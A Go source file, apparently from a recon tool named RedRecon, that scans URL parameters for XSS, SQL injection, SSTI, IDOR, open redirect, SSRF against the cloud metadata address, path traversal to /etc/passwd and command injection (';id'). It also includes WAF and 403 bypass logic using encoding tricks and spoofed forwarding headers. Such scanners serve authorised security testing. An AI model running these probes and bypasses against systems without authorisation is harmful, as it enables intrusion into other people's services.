package scan

import (
	"context"
	"fmt"
	"io"
	"log/slog"
	"net/http"
	"net/url"
	"strings"
	"sync"

	"redrecon/pkg/utils"
)

// RunNativeChecks performs manual heuristic checks for common vulnerabilities
// (XSS, SQLi, SSTI) to reduce reliance on external tools.
func RunNativeChecks(ctx context.Context, urlsFile string, resultsPath string, client *http.Client, logger *slog.Logger) error {
	logger.Info("Starting Native Vulnerability Checks (XSS, SQLi, SSTI)...")

	urls, err := utils.ReadLines(urlsFile)
	if err != nil {
		return fmt.Errorf("failed to read URLs file: %w", err)
	}

	if len(urls) == 0 {
		logger.Warn("No URLs to scan for native checks.")
		return nil
	}

	// Output file
	outputFile := fmt.Sprintf("%s/native_vulns.txt", resultsPath)
	f, err := utils.OpenFileAppend(outputFile)
	if err != nil {
		return err
	}
	defer f.Close()

	var wg sync.WaitGroup
	sem := make(chan struct{}, 20) // concurrency limit

	// Basic Payloads
	xssPayload := "<script>alert('RedRecon')</script>"
	sqliPayload := "'"
	sstiPayload := "{{7*7}}"
	sstiExpected := "49"

	// Load Configured Payloads (or defaults)
	// Example: config.Cfg.Wordlists.XSS
	// For this Implementation, we focus on the logic structure.

	for _, u := range urls {
		// Only check URLs with parameters
		if !strings.Contains(u, "?") {
			continue
		}

		wg.Add(1)
		sem <- struct{}{}
		go func(targetURL string) {
			defer wg.Done()
			defer func() { <-sem }()

			if ctx.Err() != nil {
				return
			}

			parsed, err := url.Parse(targetURL)
			if err != nil {
				return
			}

			// Fuzz Query Parameters
			query := parsed.Query()
			for param := range query {
				// XSS Check
				checkXSS(ctx, targetURL, param, xssPayload, client, f, logger)

				// SQLi Check
				checkSQLi(ctx, targetURL, param, sqliPayload, client, f, logger)

				// SSTI Check
				checkSSTI(ctx, targetURL, param, sstiPayload, sstiExpected, client, f, logger)

				// IDOR Check (if param is 'id' or similar)
				if isIDParameter(param) {
					checkIDOR(ctx, targetURL, param, client, f, logger)
				}

				// Open Redirect
				checkOpenRedirect(ctx, targetURL, param, client, f, logger)

				// SSRF
				checkSSRF(ctx, targetURL, param, client, f, logger)

				// LFI
				checkLFI(ctx, targetURL, param, client, f, logger)

				// Command Injection
				checkCommandInjection(ctx, targetURL, param, client, f, logger)
			}
		}(u)
	}

	wg.Wait()
	logger.Info("Native Vulnerability Checks completed.", "output", outputFile)
	return nil
}

func isIDParameter(param string) bool {
	lower := strings.ToLower(param)
	return lower == "id" || strings.HasSuffix(lower, "_id") || lower == "user" || lower == "account"
}

// --------------------------------------------------------------------------------
// WAF / 403 Bypass Encoders & Generators
// --------------------------------------------------------------------------------

func getEncodedPayloads(payload string) []string {
	var payloads []string
	payloads = append(payloads, payload) // Original

	// Double URL Encode
	payloads = append(payloads, url.QueryEscape(url.QueryEscape(payload)))

	// URL Encode (if original wasn't)
	if url.QueryEscape(payload) != payload {
		payloads = append(payloads, url.QueryEscape(payload))
	}

	// Hex Encode (e.g. < -> %3c) - simple implementation
	var hexBuilder strings.Builder
	for _, c := range payload {
		hexBuilder.WriteString(fmt.Sprintf("%%%x", c))
	}
	payloads = append(payloads, hexBuilder.String())

	return payloads
}

// --------------------------------------------------------------------------------
// Request Wrapper with 403 Bypass
// --------------------------------------------------------------------------------

func doRequest(ctx context.Context, client *http.Client, urlStr string) (*http.Response, string, error) {
	// First attempt: Standard Request
	resp, body, err := doSingleRequest(ctx, client, urlStr, nil)
	if err != nil {
		return nil, "", err
	}

	// If blocked (403/406), try 403 Bypass Headers
	if resp.StatusCode == 403 || resp.StatusCode == 406 {
		// Try adding common bypass headers
		bypassHeaders := map[string]string{
			"X-Forwarded-For":  "127.0.0.1",
			"X-Originating-IP": "127.0.0.1",
			"X-Remote-IP":      "127.0.0.1",
			"X-Remote-Addr":    "127.0.0.1",
			"X-Client-IP":      "127.0.0.1",
			"X-Original-URL":   urlStr,
		}

		// Retry with headers
		respBypass, bodyBypass, errBypass := doSingleRequest(ctx, client, urlStr, bypassHeaders)
		if errBypass == nil && (respBypass.StatusCode == 200 || respBypass.StatusCode != resp.StatusCode) {
			// Success or behavior change!
			return respBypass, bodyBypass, nil
		}
	}

	return resp, body, nil
}

func doSingleRequest(ctx context.Context, client *http.Client, urlStr string, extraHeaders map[string]string) (*http.Response, string, error) {
	req, err := http.NewRequestWithContext(ctx, "GET", urlStr, nil)
	if err != nil {
		return nil, "", err
	}
	// Add user-agent
	req.Header.Set("User-Agent", "RedRecon-Native-Check/1.0")

	for k, v := range extraHeaders {
		req.Header.Set(k, v)
	}

	resp, err := client.Do(req)
	if err != nil {
		return nil, "", err
	}
	defer resp.Body.Close()

	bodyBytes, err := io.ReadAll(resp.Body)
	if err != nil {
		return resp, "", err
	}

	return resp, string(bodyBytes), nil
}

func replaceParam(rawURL, param, value string) string {
	u, _ := url.Parse(rawURL)
	q := u.Query()
	q.Set(param, value)
	u.RawQuery = q.Encode() // Note: Go's Encode() handles URL encoding automatically

	// If the value is already encoded (e.g. double encoded), we might want to bypass Go's encoding?
	// But replaceParam return result is parsed by http.NewRequest which expects encoded/decoded correctly?
	// Actually, if 'value' is "%253c", Go might encode the % again if we use Set.
	// For simple bypasses, this is usually fine.

	return u.String()
}

// --------------------------------------------------------------------------------
// Modified Checks to use Encodings
// --------------------------------------------------------------------------------

func checkXSS(ctx context.Context, targetURL, param, payload string, client *http.Client, writer io.Writer, logger *slog.Logger) {
	// Try multiple encodings
	variations := getEncodedPayloads(payload)

	for _, p := range variations {
		vulnURL := replaceParam(targetURL, param, p)
		resp, body, err := doRequest(ctx, client, vulnURL)
		if err != nil {
			continue
		}

		// Check if payload is reflected (decoding body might be needed for some checks, but usually browsers handle raw)
		// Simpler check: if body contains the generic payload parts (e.g. alert)

		if strings.Contains(body, "RedRecon") || strings.Contains(body, "alert(") {
			if strings.Contains(resp.Header.Get("Content-Type"), "text/html") {
				msg := fmt.Sprintf("[VULN: Reflected XSS] %s (Payload: %s)\n", vulnURL, p)
				fmt.Print(msg)
				writer.Write([]byte(msg))
				logger.Info("Potential XSS Found", "url", vulnURL, "payload", p)
				break
			}
		}
	}
}

func checkSQLi(ctx context.Context, targetURL, param, payload string, client *http.Client, writer io.Writer, logger *slog.Logger) {
	variations := getEncodedPayloads(payload)

	for _, p := range variations {
		vulnURL := replaceParam(targetURL, param, p)
		_, body, err := doRequest(ctx, client, vulnURL)
		if err != nil {
			continue
		}

		sqlErrors := []string{
			"syntax error",
			"fatal error",
			"mysql_fetch",
			"you have an error in your sql syntax",
			"ora-01756",
			"unclosed quotation mark",
		}

		lowerBody := strings.ToLower(body)
		found := false
		for _, sqlErr := range sqlErrors {
			if strings.Contains(lowerBody, sqlErr) {
				msg := fmt.Sprintf("[VULN: SQL Injection] %s (Error: %s)\n", vulnURL, sqlErr)
				fmt.Print(msg)
				writer.Write([]byte(msg))
				logger.Info("Potential SQLi Found", "url", vulnURL)
				found = true
				break
			}
		}
		if found {
			break
		}
	}
}

func checkSSTI(ctx context.Context, targetURL, param, payload, expected string, client *http.Client, writer io.Writer, logger *slog.Logger) {
	vulnURL := replaceParam(targetURL, param, payload)
	_, body, err := doRequest(ctx, client, vulnURL)
	if err != nil {
		return
	}

	if strings.Contains(body, expected) {
		msg := fmt.Sprintf("[VULN: SSTI] %s (Reflected: %s)\n", vulnURL, expected)
		fmt.Print(msg)
		writer.Write([]byte(msg))
		logger.Info("Potential SSTI Found", "url", vulnURL)
	}
}

func checkIDOR(ctx context.Context, targetURL, param string, client *http.Client, writer io.Writer, logger *slog.Logger) {
	// Simple IDOR check: try common IDs
	payloads := []string{"1", "0", "100", "999", "admin", "test"}
	for _, p := range payloads {
		vulnURL := replaceParam(targetURL, param, p)
		resp, _, err := doRequest(ctx, client, vulnURL)
		if err != nil {
			continue
		}
		// Heuristic: If we get a 200 OK, it MIGHT be an IDOR (very prone to false positives, needs baseline comparison)
		if resp.StatusCode == 200 {
			msg := fmt.Sprintf("[POSSIBLE: IDOR] %s (Status: 200)\n", vulnURL)
			// fmt.Print(msg) // Too noisy for stdout potentially
			writer.Write([]byte(msg))
			logger.Info("Possible IDOR Found", "url", vulnURL)
			// Break to avoid flooding with findings for the same param
			break
		}
	}
}

func checkOpenRedirect(ctx context.Context, targetURL, param string, client *http.Client, writer io.Writer, logger *slog.Logger) {
	payload := "https://example.com"
	vulnURL := replaceParam(targetURL, param, payload)

	// Create a client that does NOT follow redirects
	noRedirectClient := *client
	noRedirectClient.CheckRedirect = func(req *http.Request, via []*http.Request) error {
		return http.ErrUseLastResponse
	}

	resp, _, err := doRequest(ctx, &noRedirectClient, vulnURL)
	if err != nil {
		return
	}

	location := resp.Header.Get("Location")
	if strings.Contains(location, "example.com") {
		msg := fmt.Sprintf("[VULN: Open Redirect] %s (Location: %s)\n", vulnURL, location)
		fmt.Print(msg)
		writer.Write([]byte(msg))
		logger.Info("Potential Open Redirect Found", "url", vulnURL)
	}
}

func checkSSRF(ctx context.Context, targetURL, param string, client *http.Client, writer io.Writer, logger *slog.Logger) {
	payload := "http://169.254.169.254/latest/meta-data/"
	vulnURL := replaceParam(targetURL, param, payload)
	_, body, err := doRequest(ctx, client, vulnURL)
	if err != nil {
		return
	}

	if strings.Contains(body, "ami-id") || strings.Contains(body, "instance-id") {
		msg := fmt.Sprintf("[VULN: SSRF] %s (AWS Metadata)\n", vulnURL)
		fmt.Print(msg)
		writer.Write([]byte(msg))
		logger.Info("Potential SSRF Found", "url", vulnURL)
	}
}

func checkLFI(ctx context.Context, targetURL, param string, client *http.Client, writer io.Writer, logger *slog.Logger) {
	payloads := []string{
		"../../../../etc/passwd",
		"C:\\Windows\\win.ini",
	}

	for _, p := range payloads {
		vulnURL := replaceParam(targetURL, param, p)
		_, body, err := doRequest(ctx, client, vulnURL)
		if err != nil {
			continue
		}

		if strings.Contains(body, "root:x:0:0") || strings.Contains(body, "[extensions]") {
			msg := fmt.Sprintf("[VULN: LFI] %s\n", vulnURL)
			fmt.Print(msg)
			writer.Write([]byte(msg))
			logger.Info("Potential LFI Found", "url", vulnURL)
			break
		}
	}
}

func checkCommandInjection(ctx context.Context, targetURL, param string, client *http.Client, writer io.Writer, logger *slog.Logger) {
	payloads := []string{";id", "|id", "`id`"}

	for _, p := range payloads {
		vulnURL := replaceParam(targetURL, param, p)
		_, body, err := doRequest(ctx, client, vulnURL)
		if err != nil {
			continue
		}

		if strings.Contains(body, "uid=") && strings.Contains(body, "gid=") {
			msg := fmt.Sprintf("[VULN: RCE] %s\n", vulnURL)
			fmt.Print(msg)
			writer.Write([]byte(msg))
			logger.Info("Potential RCE Found", "url", vulnURL)
			break
		}
	}
}
